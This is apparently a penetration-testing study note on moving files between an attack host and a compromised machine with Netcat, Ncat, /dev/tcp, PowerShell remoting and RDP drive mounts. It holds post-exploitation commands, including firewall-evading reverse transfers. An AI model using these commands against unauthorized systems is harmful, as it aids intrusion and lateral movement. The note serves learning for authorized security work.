
- `Netcat`, `Ncat` and `RDP` and `PowerShell` can also be used to transfer file.

- ## Netcat

	- Often (abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP.
	- Can also be used for file transfer. operation.

- ## File Transfer with Netcat and Ncat

	- Netcat can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
	
	- #### Netcat - Compromised Machine - Listening on port 8000:
	
		-  `nc -l -p 8000 > <file_name>`
		
		- `-l` is the listing option
		- `-p` for the port specification
		- `>` for redirection of stdout
	
	- ### Ncat - Compromised Machine - Listening  on port 8000:
	
		- `ncat -l -p 8000 --recv-only > <file_name>`
		
		- `--recv-only`  is used to close connection once file transfer is finished.
	
	- ### Netcat - Attack Host - Sending File to Compromised machine:

		- `nc -q 0 <Ip> <port> < <file_name>`
		
		- `-q 0` option is specified that tell Netcat close the connection once it finishes.
	
	- ### Ncat - Attack Host - Sending File to Compromised machine:
	
		- `ncat --send-only <IP> <port> < <file_name>`
		
		- `--send-only` ,when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted.
	
	- ### Attack Host - Sending Files as input to Netcat:
	
		- Connect to a specific port instead of listening on main server  to perform the file transfer.
		- This method is useful in scenarios where there's a firewall blocking inbound connection
		
		- `nc -l -p <port> -q 0 < <file_name>`
	
	- ### Compromised Machine Connect to Netcat to Receive the File:
		
		- `nc <IP> <port> > <file_name>`
	
	- ### Attack Host - Sending File as Input to Ncat:
	
		- `ncat -l -p <port> --send-only < <file_name>`
	
	- ### Compromised Machine Connect to Ncat to Receive the File
	
		- `ncat <IP> <Port> --recv-only > <file_name>`
	
	- ### Netcat -  Sending File as Input to Netcat
	
		- `nc -l -p <port> -q 0 < <file_name>`
	
	- ### Ncat - Sending File as Input to Ncat
		
		- `ncat -l -p <port> --send-only < <file_name>`

- #### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

	- `cat < /dev/tcp/<IP>/<port> > <file_name>`

# PowerShell Session File Transfer

- PowerShell Remoting aka WinRM to perform file transfer operations.
- PowerShell Remoting allows to execute scripts or command on a remote computer using PowerShell sessions.
- PowerShell remoting creates both an HTTP and an HTTPS listener.
- The listeners run on default ports ==***TCP/5985 for HTTP and TCP/5986 for HTTPS.***==


- To create a PowerShell Remoting session on a remote computer, need administrative access, be a member of the Remote Management Users group Or have a explicit permissions for PowerShell Remoting.

- ## From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01:

	- Use `Test-NetConnection` to confirm the connectivity to WinRM
	
		- PowerShell:
		
			- `Test-NetConnection -ComputerName DATABASE01 -Port 5985`

		- #### Create a PowerShell Remoting Session to DATABASE01
		
			- `$Session = New-PSSession -ComputerName DATABASE01` 
		
		- #### Copy samplefile.txt from the Localhost to the DATABASE01 Session
		
			- `Copy-Item -Path <file_path\sample.txt> -ToSession $Session -Destination <destination_path>`
		
		- ### Copy DATABASE.txt from DATABASE01 Session to the localhost
		
			- `Copy-Item -Path "<file_path\DATABASE.txt>" -Destination C:\ -FromSession $Session`
		

# RDP {Remote Desktop Protocol}

- ### Mounting a Linux Folder Using rdesktop:
	
	-  `rdesktop <IP> -d alice\CONSTOSO -u <username> -p <password> -r disk:linux='<file_path_in_linux>'`

- ### Mounting a Linux folder Using xfreerdp:

	- `xfreerdp /v:<IP> /d:CONSTOSO\alice /u:<username> /p:'<password>' /drive:linux, <file_path_in_linux>`

- ### RDP can also use to mount linux file :

	- Select local Resource 
	- Configure Local devices and resources
		- select Drives and configure it.

[[File Transfer]]